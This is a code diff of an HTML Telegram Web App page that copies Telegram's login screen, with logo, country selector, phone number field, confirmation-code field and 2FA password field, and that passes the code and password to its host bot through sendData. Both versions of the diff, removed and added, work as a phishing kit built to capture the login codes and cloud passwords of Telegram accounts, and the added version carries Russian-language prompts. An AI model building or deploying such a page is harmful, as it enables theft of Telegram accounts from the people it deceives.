@@ -3,197 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Telegram</title>
+    <title>Telegram Login</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
             --tg-bg: var(--tg-theme-bg-color, #212121);
-            --tg-sec-bg: var(--tg-theme-secondary-bg-color, #0f0f0f);
             --tg-text: var(--tg-theme-text-color, #ffffff);
             --tg-hint: var(--tg-theme-hint-color, #aaaaaa);
             --tg-btn: #3390ec;
-            --tg-btn-text: #ffffff;
         }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: var(--tg-bg);
-            color: var(--tg-text);
-            margin: 0; padding: 0;
-            display: flex; flex-direction: column; align-items: center;
-            height: 100vh; width: 100vw; overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: var(--tg-bg); color: var(--tg-text);
+            margin: 0; display: flex; flex-direction: column; align-items: center;
         }
-
-        /* Настоящий логотип Telegram */
-        .tg-logo {
-            margin-top: 45px;
-            width: 100px; height: 100px;
-            background: #24A1DE;
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-        }
-        .tg-logo svg {
-            width: 60px; height: 60px;
-            fill: white;
-            transform: translate(-3px, 1px);
-        }
-
-        h1 { font-size: 26px; font-weight: 500; margin: 25px 0 12px; }
-        .sub { color: var(--tg-hint); font-size: 16px; text-align: center; padding: 0 40px; line-height: 1.3; margin-bottom: 40px; }
-
-        /* Поля ввода */
-        .form-container { width: 100%; max-width: 340px; padding: 0 20px; box-sizing: border-box; }
-
-        .input-box {
-            background: none;
-            border: 1px solid #444;
-            border-radius: 12px;
-            padding: 15px;
-            margin-bottom: 15px;
-            display: flex; justify-content: space-between; align-items: center;
-            cursor: pointer;
-            transition: border 0.2s;
-        }
-        .input-box:active { border-color: var(--tg-btn); }
-        
-        .input-box span { font-size: 17px; }
-        .arrow { border: solid var(--tg-hint); border-width: 0 2px 2px 0; display: inline-block; padding: 3px; transform: rotate(-45deg); }
-
-        .phone-row { display: flex; gap: 10px; }
-        .field { 
-            background: none; border: 1px solid #444; border-radius: 12px; 
-            padding: 15px; font-size: 18px; color: white; outline: none; width: 100%;
-        }
-        .field:focus { border-color: var(--tg-btn); }
-
-        .btn-next {
-            background: var(--tg-btn);
-            color: white; border: none; border-radius: 12px;
-            padding: 16px; width: 100%; font-size: 16px; font-weight: 600;
-            margin-top: 25px; cursor: pointer;
-        }
-
-        /* Модалка стран */
-        #country-modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: var(--tg-bg); z-index: 1000; display: none; flex-direction: column;
-        }
-        .search-nav { padding: 10px 15px; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid #333; }
-        .search-input { background: none; border: none; color: white; font-size: 18px; width: 100%; outline: none; }
-        .list { overflow-y: auto; flex: 1; }
-        .item { padding: 15px 20px; border-bottom: 1px solid #2b2b2b; display: flex; justify-content: space-between; font-size: 17px; }
-
+        .tg-logo { margin-top: 50px; width: 100px; height: 100px; background: #24A1DE; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .tg-logo svg { width: 60px; height: 60px; fill: white; transform: translate(-2px, 1px); }
+        h1 { font-size: 26px; margin: 25px 0 10px; }
+        .sub { color: var(--tg-hint); text-align: center; padding: 0 40px; margin-bottom: 30px; }
+        .form { width: 100%; max-width: 320px; padding: 0 20px; box-sizing: border-box; }
+        .input-box { border: 1px solid #444; border-radius: 12px; padding: 15px; margin-bottom: 10px; display: flex; justify-content: space-between; cursor: pointer; }
+        .field { background: none; border: 1px solid #444; border-radius: 12px; padding: 15px; font-size: 18px; color: white; width: 100%; outline: none; margin-bottom: 10px; }
+        .btn { background: var(--tg-btn); color: white; border: none; border-radius: 12px; padding: 16px; width: 100%; font-size: 16px; font-weight: 600; cursor: pointer; }
+        #country-modal { position: fixed; top: 0; background: var(--tg-bg); width: 100%; height: 100%; display: none; flex-direction: column; z-index: 100; }
+        .item { padding: 15px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; }
         .step { display: none; width: 100%; flex-direction: column; align-items: center; }
-        .active { display: flex; animation: fadeIn 0.2s ease-in-out; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+        .active { display: flex; }
     </style>
 </head>
 <body>
-
-<div class="tg-logo">
-    <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.26.26-.54.26l.196-2.91 5.297-4.787c.23-.204-.05-.318-.356-.116l-6.547 4.12-2.82-.88c-.613-.193-.625-.613.128-.91l11.02-4.247c.51-.186.957.118.722.88z"/></svg>
-</div>
-
-<h1>Telegram</h1>
-
-<div class="form-container">
-    <div id="step1" class="step active">
-        <div class="sub">Please confirm your country code and enter your phone number.</div>
-        <div class="input-box" onclick="showCountries()">
-            <span id="c-name">Russia</span>
-            <div class="arrow"></div>
+    <div class="tg-logo"><svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.26.26-.54.26l.196-2.91 5.297-4.787c.23-.204-.05-.318-.356-.116l-6.547 4.12-2.82-.88c-.613-.193-.625-.613.128-.91l11.02-4.247c.51-.186.957.118.722.88z"/></svg></div>
+    <h1>Telegram</h1>
+    <div class="form">
+        <div id="step1" class="step active">
+            <div class="sub">Выберите страну и введите номер телефона.</div>
+            <div class="input-box" onclick="openM()"> <span id="cn">Russia</span> <span>></span> </div>
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="cc" class="field" style="width:70px" value="+7" readonly>
+                <input type="tel" id="ph" class="field" placeholder="000 000 0000">
+            </div>
+            <button class="btn" onclick="next1()">NEXT</button>
         </div>
-        <div class="phone-row">
-            <input type="text" id="c-code" class="field" style="width: 70px;" value="+7" readonly>
-            <input type="tel" id="phone" class="field" placeholder="Phone number">
+        <div id="step2" class="step">
+            <div class="sub">Введите 5-значный код из чата Telegram.</div>
+            <input type="number" id="sms" class="field" style="text-align:center; letter-spacing:5px">
+            <button class="btn" onclick="next2()">CONFIRM</button>
         </div>
-        <button class="btn-next" onclick="toStep2()">NEXT</button>
+        <div id="step3" class="step">
+            <div class="sub">Введите облачный пароль (2FA).</div>
+            <input type="password" id="pw" class="field">
+            <button class="btn" onclick="done()">FINISH</button>
+        </div>
     </div>
-
-    <div id="step2" class="step">
-        <div class="sub">We've sent an SMS with an activation code to your phone.</div>
-        <input type="number" id="sms" class="field" placeholder="00000" style="text-align: center; letter-spacing: 8px;">
-        <button class="btn-next" onclick="toStep3()">CONFIRM</button>
+    <div id="country-modal">
+        <div style="padding:20px; color:var(--tg-btn)" onclick="closeM()">Назад</div>
+        <div id="clist"></div>
     </div>
-
-    <div id="step3" class="step">
-        <div class="sub">Your account is protected by an additional password.</div>
-        <input type="password" id="2fa" class="field" placeholder="Password">
-        <button class="btn-next" onclick="finish()">FINISH</button>
-    </div>
-</div>
-
-<div id="country-modal">
-    <div class="search-nav">
-        <span onclick="closeCountries()" style="cursor:pointer; color:var(--tg-btn); font-size:24px;">✕</span>
-        <input type="text" class="search-input" placeholder="Search" oninput="search(this.value)">
-    </div>
-    <div class="list" id="country-list"></div>
-</div>
-
-<script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
-
-    // База данных стран (основные, можно дополнить)
-    const data = [
-        {n:"Afghanistan", c:"+93"}, {n:"Albania", c:"+355"}, {n:"Algeria", c:"+213"}, {n:"Argentina", c:"+54"},
-        {n:"Armenia", c:"+374"}, {n:"Australia", c:"+61"}, {n:"Austria", c:"+43"}, {n:"Azerbaijan", c:"+994"},
-        {n:"Belarus", c:"+375"}, {n:"Belgium", c:"+32"}, {n:"Brazil", c:"+55"}, {n:"Canada", c:"+1"},
-        {n:"China", c:"+86"}, {n:"Egypt", c:"+20"}, {n:"France", c:"+33"}, {n:"Germany", c:"+49"},
-        {n:"Georgia", c:"+995"}, {n:"India", c:"+91"}, {n:"Israel", c:"+972"}, {n:"Italy", c:"+39"},
-        {n:"Kazakhstan", c:"+7"}, {n:"Kyrgyzstan", c:"+996"}, {n:"Latvia", c:"+371"}, {n:"Lithuania", c:"+370"},
-        {n:"Moldova", c:"+373"}, {n:"Poland", c:"+48"}, {n:"Russia", c:"+7"}, {n:"Spain", c:"+34"},
-        {n:"Turkey", c:"+90"}, {n:"Ukraine", c:"+380"}, {n:"UAE", c:"+971"}, {n:"UK", c:"+44"}, {n:"USA", c:"+1"}, {n:"Uzbekistan", c:"+998"}
-    ];
-
-    function showCountries() { document.getElementById('country-modal').style.display = 'flex'; search(''); }
-    function closeCountries() { document.getElementById('country-modal').style.display = 'none'; }
-
-    function search(q) {
-        const l = document.getElementById('country-list');
-        l.innerHTML = '';
-        data.filter(x => x.n.toLowerCase().includes(q.toLowerCase())).forEach(x => {
-            const el = document.createElement('div');
-            el.className = 'item';
-            el.innerHTML = `<span>${x.n}</span><span style="color:var(--tg-btn)">${x.c}</span>`;
-            el.onclick = () => {
-                document.getElementById('c-name').innerText = x.n;
-                document.getElementById('c-code').value = x.c;
-                closeCountries();
-            };
-            l.appendChild(el);
-        });
-    }
-
-    function nav(id) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step'+id).classList.add('active');
-    }
-
-    function toStep2() {
-        const p = document.getElementById('phone').value;
-        if(p.length > 5) {
-            tg.sendData("PHONE_REQUESTED"); // Сигнал Python боту
-            nav(2);
+    <script>
+        const tg = window.Telegram.WebApp; tg.expand();
+        const countries = [{n:"Russia", c:"+7"}, {n:"Kazakhstan", c:"+7"}, {n:"Ukraine", c:"+380"}, {n:"Uzbekistan", c:"+998"}, {n:"Belarus", c:"+375"}];
+        function openM() {
+            const l = document.getElementById('clist'); l.innerHTML = '';
+            countries.forEach(x => {
+                let d = document.createElement('div'); d.className = 'item';
+                d.innerHTML = `<span>${x.n}</span><span>${x.c}</span>`;
+                d.onclick = () => { document.getElementById('cn').innerText = x.n; document.getElementById('cc').value = x.c; closeM(); };
+                l.appendChild(d);
+            });
+            document.getElementById('country-modal').style.display = 'flex';
         }
-    }
-
-    function toStep3() {
-        const c = document.getElementById('sms').value;
-        if(c.length === 5) {
-            tg.sendData("CODE:" + c);
-            nav(3);
-        }
-    }
-
-    function finish() {
-        const pass = document.getElementById('2fa').value;
-        if(pass.length > 0) {
-            tg.sendData("PASS:" + pass);
-            setTimeout(() => tg.close(), 1000);
-        }
-    }
-</script>
+        function closeM() { document.getElementById('country-modal').style.display = 'none'; }
+        function next1() { if(document.getElementById('ph').value.length > 5) { tg.sendData("PHONE_REQUESTED"); document.querySelectorAll('.step').forEach(s=>s.classList.remove('active')); document.getElementById('step2').classList.add('active'); } }
+        function next2() { let v = document.getElementById('sms').value; if(v.length === 5) { tg.sendData("CODE:" + v); document.querySelectorAll('.step').forEach(s=>s.classList.remove('active')); document.getElementById('step3').classList.add('active'); } }
+        function done() { tg.sendData("PASS:" + document.getElementById('pw').value); setTimeout(()=>tg.close(), 1000); }
+    </script>
 </body>
 </html>
